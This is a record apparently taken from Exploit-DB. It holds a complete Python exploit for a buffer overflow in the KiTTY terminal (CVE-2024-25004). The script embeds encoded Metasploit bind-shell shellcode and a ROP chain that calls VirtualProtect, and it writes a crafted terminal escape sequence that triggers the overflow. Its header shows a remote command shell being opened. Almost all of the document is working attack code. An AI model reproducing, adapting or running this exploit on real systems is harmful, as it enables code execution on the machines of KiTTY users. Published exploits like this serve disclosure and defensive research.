{"source": "https://www.exploit-db.com/exploits/51891", "vulnName": "KiTTY 0.76.1.13 - 'Start Duplicated Session Username' Buffer Overflow", "vulnEDBID": "51891", "vulnCVE": "2024-25004", "author": "DEFCESCO", "exploitType": "LOCAL", "platform": "WINDOWS", "datePublished": "2024-03-14", "vulnContent": "# Exploit Title: KiTTY 0.76.1.13 - 'Start Duplicated Session Username' Buffer Overflow\n# Exploit Author: DEFCESCO (Austin A. DeFrancesco)\n# Vendor Homepage: https://github.com/cyd01/KiTTY/=\n# Software Link: https://github.com/cyd01/KiTTY/releases/download/v0.76.1.13/kitty-bin-0.76.1.13.zip\n# Version: \u2264 0.76.1.13\n# Tested on: Microsoft Windows 11/10/8/7/XP\n# CVE: CVE-2024-25004\n#-------------------------------------------------------------------------------------#\n# Blog: https://blog.DEFCESCO.io/Hell0+KiTTY\n#-------------------------------------------------------------------------------------#\n# msf6 payload(windows/shell_bind_tcp) > to_handler                                   #\n# [*] Payload Handler Started as Job 1                                                #\n# msf6 payload(windows/shell_bind_tcp) >                                              #\n# [*] Started bind TCP handler against 192.168.100.28:4444                            #\n# [*] Command shell session 1 opened (192.168.100.119:34285 -> 192.168.100.28:4444)   # \n#-------------------------------------------------------------------------------------#\n\nimport sys\nimport os\nimport struct\n\n#-------------------------------------------------------------------------------------#\n# msf6 payload(windows/shell_bind_tcp) > generate -b '\\x00\\x07\\x0a\\x0d\\x1b\\x9c' -f py #\n# windows/shell_bind_tcp - 355 bytes                                                  #\n# https://metasploit.com/                                                             #\n# Encoder: x86/shikata_ga_nai                                                         #\n# VERBOSE=false, LPORT=4444, RHOST=192.168.100.28,                                    #\n# PrependMigrate=false, EXITFUNC=process, CreateSession=true,                         #\n# AutoVerifySession=true                                                              #\n#-------------------------------------------------------------------------------------#\n\nbuf =  b\"\"\nbuf += b\"\\xd9\\xe9\\xd9\\x74\\x24\\xf4\\xbd\\xfe\\xb7\\xa4\\x99\\x5e\"\nbuf += b\"\\x29\\xc9\\xb1\\x53\\x83\\xee\\xfc\\x31\\x6e\\x13\\x03\\x90\"\nbuf += b\"\\xa4\\x46\\x6c\\x90\\x23\\x04\\x8f\\x68\\xb4\\x69\\x19\\x8d\"\nbuf += b\"\\x85\\xa9\\x7d\\xc6\\xb6\\x19\\xf5\\x8a\\x3a\\xd1\\x5b\\x3e\"\nbuf += b\"\\xc8\\x97\\x73\\x31\\x79\\x1d\\xa2\\x7c\\x7a\\x0e\\x96\\x1f\"\nbuf += b\"\\xf8\\x4d\\xcb\\xff\\xc1\\x9d\\x1e\\xfe\\x06\\xc3\\xd3\\x52\"\nbuf += b\"\\xde\\x8f\\x46\\x42\\x6b\\xc5\\x5a\\xe9\\x27\\xcb\\xda\\x0e\"\nbuf += b\"\\xff\\xea\\xcb\\x81\\x8b\\xb4\\xcb\\x20\\x5f\\xcd\\x45\\x3a\"\nbuf += b\"\\xbc\\xe8\\x1c\\xb1\\x76\\x86\\x9e\\x13\\x47\\x67\\x0c\\x5a\"\nbuf += b\"\\x67\\x9a\\x4c\\x9b\\x40\\x45\\x3b\\xd5\\xb2\\xf8\\x3c\\x22\"\nbuf += b\"\\xc8\\x26\\xc8\\xb0\\x6a\\xac\\x6a\\x1c\\x8a\\x61\\xec\\xd7\"\nbuf += b\"\\x80\\xce\\x7a\\xbf\\x84\\xd1\\xaf\\xb4\\xb1\\x5a\\x4e\\x1a\"\nbuf += b\"\\x30\\x18\\x75\\xbe\\x18\\xfa\\x14\\xe7\\xc4\\xad\\x29\\xf7\"\nbuf += b\"\\xa6\\x12\\x8c\\x7c\\x4a\\x46\\xbd\\xdf\\x03\\xab\\x8c\\xdf\"\nbuf += b\"\\xd3\\xa3\\x87\\xac\\xe1\\x6c\\x3c\\x3a\\x4a\\xe4\\x9a\\xbd\"\nbuf += b\"\\xad\\xdf\\x5b\\x51\\x50\\xe0\\x9b\\x78\\x97\\xb4\\xcb\\x12\"\nbuf += b\"\\x3e\\xb5\\x87\\xe2\\xbf\\x60\\x3d\\xea\\x66\\xdb\\x20\\x17\"\nbuf += b\"\\xd8\\x8b\\xe4\\xb7\\xb1\\xc1\\xea\\xe8\\xa2\\xe9\\x20\\x81\"\nbuf += b\"\\x4b\\x14\\xcb\\xbc\\xd7\\x91\\x2d\\xd4\\xf7\\xf7\\xe6\\x40\"\nbuf += b\"\\x3a\\x2c\\x3f\\xf7\\x45\\x06\\x17\\x9f\\x0e\\x40\\xa0\\xa0\"\nbuf += b\"\\x8e\\x46\\x86\\x36\\x05\\x85\\x12\\x27\\x1a\\x80\\x32\\x30\"\nbuf += b\"\\x8d\\x5e\\xd3\\x73\\x2f\\x5e\\xfe\\xe3\\xcc\\xcd\\x65\\xf3\"\nbuf += b\"\\x9b\\xed\\x31\\xa4\\xcc\\xc0\\x4b\\x20\\xe1\\x7b\\xe2\\x56\"\nbuf += b\"\\xf8\\x1a\\xcd\\xd2\\x27\\xdf\\xd0\\xdb\\xaa\\x5b\\xf7\\xcb\"\nbuf += b\"\\x72\\x63\\xb3\\xbf\\x2a\\x32\\x6d\\x69\\x8d\\xec\\xdf\\xc3\"\nbuf += b\"\\x47\\x42\\xb6\\x83\\x1e\\xa8\\x09\\xd5\\x1e\\xe5\\xff\\x39\"\nbuf += b\"\\xae\\x50\\x46\\x46\\x1f\\x35\\x4e\\x3f\\x7d\\xa5\\xb1\\xea\"\nbuf += b\"\\xc5\\xd5\\xfb\\xb6\\x6c\\x7e\\xa2\\x23\\x2d\\xe3\\x55\\x9e\"\nbuf += b\"\\x72\\x1a\\xd6\\x2a\\x0b\\xd9\\xc6\\x5f\\x0e\\xa5\\x40\\x8c\"\nbuf += b\"\\x62\\xb6\\x24\\xb2\\xd1\\xb7\\x6c\"\n\n\ndef shellcode():\n sc = b'' \n sc += b'\\xBB\\x44\\x24\\x44\\x44' # mov    ebx,0x44442444\n sc += b'\\xB8\\x44\\x44\\x44\\x44' # mov    eax,0x44444444\n sc += b'\\x29\\xD8'             # sub    eax,ebx\n sc += b'\\x29\\xC4'             # sub    esp,eax\n sc += buf\n sc += b'\\x90' * (1042-len(sc))\n assert len(sc) == 1042 \n return sc\n\n\ndef create_rop_chain():\n # rop chain generated with mona.py - www.corelan.be\n rop_gadgets = [\n #[---INFO:gadgets_to_set_esi:---]\n 0x004c5832,  # POP EAX # ADD ESP,14 # POP EBX # POP ESI # RETN [kitty.exe]\n 0x006424a4,  # ptr to &VirtualProtect() [IAT kitty.exe]\n 0x41414141,  # Filler (compensate)\n 0x41414141,  # Filler (compensate)\n 0x41414141,  # Filler (compensate)\n 0x41414141,  # Filler (compensate)\n 0x41414141,  # Filler (compensate)\n 0x41414141,  # Filler (compensate)\n 0x41414141,  # Filler (compensate)\n 0x00484e07,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [kitty.exe]\n 0x00473cf6,  # XCHG EAX,ESI # RETN [kitty.exe]\n #[---INFO:gadgets_to_set_ebp:---]\n 0x00429953,  # POP EBP # RETN [kitty.exe]\n 0x005405b0,  # PUSH ESP; RETN 0 [kitty.exe]\n #[---INFO:gadgets_to_set_ebx:---]\n 0x0049d9f9,  # POP EBX # RETN [kitty.exe]\n 0x00000201,  # 0x00000201-> ebx\n #[---INFO:gadgets_to_set_edx:---]\n 0x00430dce,  # POP EDX # RETN [kitty.exe]\n 0x00000040,  # 0x00000040-> edx\n #[---INFO:gadgets_to_set_ecx:---]\n 0x005ac58c,  # POP ECX # RETN [kitty.exe]\n 0x004d81d9,  # &Writable location [kitty.exe]\n #[---INFO:gadgets_to_set_edi:---]\n 0x004fa404,  # POP EDI # RETN [kitty.exe]\n 0x005a2001,  # RETN (ROP NOP) [kitty.exe]\n #[---INFO:gadgets_to_set_eax:---]\n 0x004cd011,  # POP EAX # POP EBX # RETN [kitty.exe]\n 0x90909090,  # nop\n 0x41414141,  # Filler (compensate)\n #[---INFO:pushad:---]\n 0x005dfbac,  # PUSHAD # RETN [kitty.exe]\n ]\n return b''.join(struct.pack('<I', _) for _ in rop_gadgets)\n\nrop_chain = create_rop_chain()\n\n\n#----------------------------------------------------------------------------------#\n# Badchars: \\x00\\x07\\x0a\\x0d\\x1b\\x9c\\x9d                                           #\n# Return Address Information: 0x00529720 : {pivot 324 / 0x144} :                   #\n#   ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN                     #\n#   ** [kitty.exe] **   |  startnull {PAGE_EXECUTE_READWRITE}                      #\n# Shellcode size at ESP: 1042 bytes                                                #\n#----------------------------------------------------------------------------------#\n\nreturn_address = struct.pack('<I',  0x00529720) # ADD ESP,134 # POP EBX # POP ESI # POP EDI # POP EBP # RETN    ** [kitty.exe] **   |  startnull {PAGE_EXECUTE_READWRITE}\n\nrop_chain_padding = b'\\x90' * 27\nnops = b'\\x90' * 88\n\nescape_sequence = b'\\033]0;__dt:localhost:' + shellcode() + return_address\nescape_sequence += rop_chain_padding + rop_chain\nescape_sequence += b'\\xE9\\x3D\\xFA\\xFF\\xFF' # jmp $eip-1471\nescape_sequence += nops + b'\\007'\n\nstdout = os.fdopen(sys.stdout.fileno(), 'wb') \nstdout.write(escape_sequence)\nstdout.flush()\n            "}